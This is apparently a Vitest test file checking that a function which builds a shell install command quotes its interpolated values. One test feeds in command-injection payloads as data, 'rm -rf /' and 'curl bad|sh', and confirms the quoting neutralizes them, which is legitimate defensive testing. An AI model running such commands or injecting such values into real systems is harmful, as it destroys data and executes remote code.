import { describe, expect, it } from "vitest";
import { buildInstallCommand } from "./install-command";

describe("buildInstallCommand", () => {
  it("quotes every interpolated value", () => {
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok-123",
      "edge-east-01",
    );
    expect(cmd).toContain("--panel-url 'https://panel.example.com'");
    expect(cmd).toContain("--token 'tok-123'");
    expect(cmd).toContain("--node-name 'edge-east-01'");
  });

  it("neutralizes shell metachars in token and node name", () => {
    // The wizard pre-validates nodeName via isValidNodeName, but the
    // build function still has to be safe in isolation: token comes
    // straight from the backend and could in theory contain quirky
    // bytes; defense-in-depth.
    const cmd = buildInstallCommand(
      "https://panel.example.com",
      "tok'; rm -rf / #",
      "x;curl bad|sh",
    );
    // Single-quoted: nothing inside expands or breaks the argv slot.
    expect(cmd).toContain(String.raw`--token 'tok'\''; rm -rf / #'`);
    expect(cmd).toContain("--node-name 'x;curl bad|sh'");
    // No bare semicolon escapes the quoting.
    expect(cmd).not.toMatch(/--token tok'; rm/);
  });

  it("omits advanced flags when values match defaults", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node", {
      telemtUrl: "http://127.0.0.1:9091",
      telemtMetricsUrl: "http://127.0.0.1:8081",
      telemtAuth: "",
      insecureTransport: false,
    });
    expect(cmd).not.toContain("--telemt-url");
    expect(cmd).not.toContain("--telemt-metrics-url");
    expect(cmd).not.toContain("--telemt-auth");
    expect(cmd).not.toContain("--insecure-transport");
  });

  it("appends and quotes advanced flags when overridden", () => {
    const cmd = buildInstallCommand("https://p", "tok", "node", {
      telemtUrl: "http://10.0.0.5:9091",
      telemtMetricsUrl: "http://10.0.0.5:8081",
      telemtAuth: "user:p@ss'word",
      insecureTransport: true,
    });
    expect(cmd).toContain("--telemt-url 'http://10.0.0.5:9091'");
    expect(cmd).toContain("--telemt-metrics-url 'http://10.0.0.5:8081'");
    // Single quote in the auth string survives the round-trip.
    expect(cmd).toContain(String.raw`--telemt-auth 'user:p@ss'\''word'`);
    expect(cmd).toContain("--insecure-transport");
  });
});
